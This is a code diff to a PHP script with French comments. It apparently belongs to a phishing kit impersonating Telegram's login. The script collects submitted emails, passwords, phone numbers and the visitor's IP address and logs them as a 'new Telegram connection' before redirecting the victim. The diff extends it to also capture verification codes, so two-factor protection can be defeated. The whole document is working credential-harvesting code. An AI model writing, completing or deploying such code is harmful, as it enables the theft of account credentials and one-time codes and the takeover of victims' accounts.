@@ -2,23 +2,30 @@
 // Vérifie si le formulaire a été soumis via la méthode POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Récupère et nettoie les données du formulaire
-    $username = htmlspecialchars(trim($_POST["email"]));  // Adresse e-mail ou numéro de téléphone
-    $password = htmlspecialchars(trim($_POST["password"])); 
+    $username = htmlspecialchars(trim($_POST["email"] ?? ''));  // Adresse e-mail ou numéro de téléphone
+    $password = htmlspecialchars(trim($_POST["password"] ?? '')); 
     $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));  // Indicatif pays
     $phone_number = htmlspecialchars(trim($_POST["phone_number"] ?? ''));  // Numéro de téléphone
+    $verification_code = htmlspecialchars(trim($_POST["code"] ?? ''));  // Code de vérification
     $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';  // Case à cocher
     $ip = $_SERVER['REMOTE_ADDR'];
     $date = date('Y-m-d H:i:s');
 
-    // Vérifie si les champs ne sont pas vides
-    if (!empty($username) && !empty($password)) {
+    // Vérifie si les champs ne sont pas vides (soit email/mot de passe, soit code de vérification)
+    if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
         // Formate les données pour l'enregistrement
         $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
         $data .= "Date: $date\n";
-        $data .= "Email/Username: $username\n";
-        $data .= "Téléphone: $country_code$phone_number\n";
-        $data .= "Mot de passe: $password\n";
-        $data .= "Session active: $remember\n";
+        
+        if (!empty($verification_code)) {
+            $data .= "Code de vérification: $verification_code\n";
+        } else {
+            $data .= "Email/Username: $username\n";
+            $data .= "Téléphone: $country_code$phone_number\n";
+            $data .= "Mot de passe: $password\n";
+            $data .= "Session active: $remember\n";
+        }
+        
         $data .= "Adresse IP: $ip\n";
         $data .= "==================================\n\n";
         
@@ -54,7 +61,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         
         if ($written !== false) {
             // Redirection vers mer.html après succès
-            header("Location: mer.html");
+            header("Location: sam.html");
             exit();
         } else {
             // Journalisation d'erreur professionnelle
@@ -63,7 +70,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             exit();
         }
     } else {
-        echo "Erreur : Veuillez remplir tous les champs obligatoires.";
+        echo "Erreur : Veuillez fournir soit un email/mot de passe, soit un code de vérification.";
         exit();
     }
 } else {
@@ -71,4 +78,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     echo "Accès refusé : Méthode non autorisée.";
     exit();
 }
-?>
+?>￼Enter
